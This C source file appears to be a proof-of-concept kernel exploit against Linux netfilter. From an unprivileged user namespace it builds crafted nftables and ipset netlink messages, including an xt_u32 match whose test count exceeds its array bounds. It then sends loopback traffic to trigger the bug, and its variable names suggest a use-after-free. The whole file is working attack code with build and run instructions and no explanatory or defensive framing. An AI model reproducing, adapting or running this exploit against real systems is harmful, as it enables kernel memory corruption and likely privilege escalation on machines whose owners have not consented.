#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <pthread.h>

// gcc poc.c -o poc -l mnl -l nftnl
// or static:
// gcc poc.c -o poc -static -L/usr/local/lib/ -l nftnl -l mnl
// ./poc


#define IPSET_DIM_MAX 6

struct xt_set_info_v0 {
        unsigned short index;
        union {
                __u32 flags[IPSET_DIM_MAX + 1];
                struct {
                __u32 __flags[IPSET_DIM_MAX];
                __u8 dim;
                __u8 flags;
                } compat;
        } u;
};



struct xt_u32_location_element {
                __u32 number;
                        __u8 nextop;
};

struct xt_u32_value_element {
                __u32 min;
                        __u32 max;
};


#define XT_U32_MAXSIZE 10

struct xt_u32_test {
                struct xt_u32_location_element location[XT_U32_MAXSIZE+1];
                        struct xt_u32_value_element value[XT_U32_MAXSIZE+1];
                                __u8 nnums;
                                        __u8 nvalues;
};

struct xt_u32 {
                struct xt_u32_test tests[XT_U32_MAXSIZE+1];
                        __u8 ntests;
                                __u8 invert;
};



void
unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void
netfilter()
{
    char * table_name = "table";
    char * set_name = NULL;
    uint8_t family = NFPROTO_IPV4;

    uint32_t set_id = 1;

    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    struct nftnl_expr * exprs[128];
    struct nftnl_rule * rules[128];
    int exprid = 0;
    int ruleid = 0;

    struct nftnl_set * set_stable =  nftnl_set_alloc();
    struct nftnl_set * set_trigger =  nftnl_set_alloc();
    struct nftnl_set * set_uaf =  nftnl_set_alloc();

    set_name = "set_stable";
    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);


    struct nftnl_chain *chain1 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_NAME, "chain1");
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_HOOKNUM, NF_INET_PRE_ROUTING);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_PRIO, 1);


    struct xt_set_info_v0 *xt_set_info;

    rules[ruleid] = nftnl_rule_alloc();
    nftnl_rule_set_str(rules[ruleid], NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rules[ruleid], NFTNL_RULE_CHAIN, "chain1");

    exprs[exprid] = nftnl_expr_alloc("match");
    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_MT_NAME, "u32");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_MT_REV, 0);

    struct xt_u32 *buf2 = (struct xt_u32 *)malloc(0x1000);
    buf2->ntests = 0x40;
    for(int i = 0; i < 11; i++) {
            buf2->tests[i].nnums = 1;
            buf2->tests[i].nvalues = 10;
            buf2->tests[i].location[0].number = 0;
            for(int j = 0; j < 11; j++) {
                    buf2->tests[i].value[j].min = 0;
                    buf2->tests[i].value[j].max = 0xffffffff;
            }
    }
    nftnl_expr_set_data(exprs[exprid], NFTNL_EXPR_MT_INFO, (void *)buf2, 0x7c0);
    nftnl_rule_add_expr(rules[ruleid], exprs[exprid++]);

    struct nlmsghdr * nlh;
    struct nfgenmsg *nfh;
    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 0x100;
    char *buf = (char *)calloc(1, buf_size);

    struct mnl_nlmsg_batch * batch;
    int seq = 0;



    struct mnl_socket * nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        err(1, "mnl_socket_open");
    }




    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nlh = mnl_nlmsg_put_header(mnl_nlmsg_batch_current(batch));
    nlh->nlmsg_type = NFNL_SUBSYS_IPSET << 8 | 2; // create
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE|NLM_F_ACK;
    nlh->nlmsg_seq = seq++;
    
    nfh = mnl_nlmsg_put_extra_header(nlh, sizeof(struct nfgenmsg));
    nfh->nfgen_family = family;
    nfh->version = 0;
    nfh->res_id = 0;

    mnl_attr_put_u8(nlh, 1, 7); // IPSET_ATTR_PROTOCOL
    mnl_attr_put_strz(nlh, 2, "name"); // IPSET_ATTR_SETNAME
    mnl_attr_put_strz(nlh, 3, "list:set"); // IPSET_ATTR_TYPENAME
    mnl_attr_put_u8(nlh, 4, 0); // IPSET_ATTR_REVISION
    mnl_attr_put_u8(nlh, 5, 0); // IPSET_ATTR_FAMILY

    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);


    // ip set create
    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }


    seq = 0;
    batch = mnl_nlmsg_batch_start(buf, buf_size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);


    // add table
    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE, family, 0, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    // add set_stable
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_stable);
    nftnl_set_free(set_stable);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWCHAIN, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain1);
    mnl_nlmsg_batch_next(batch);


    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }



    seq = 0;
    batch = mnl_nlmsg_batch_start(buf, buf_size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWRULE, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);

    nftnl_rule_nlmsg_build_payload(nlh, rules[ruleid]);
    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }
    
    system("ip link set dev lo up");
    system("ping -c 3 127.0.0.1");

}

int
main(int argc, char ** argv)
{
    unshare_setup(getuid(), getgid());
    netfilter();
    return 0;
}
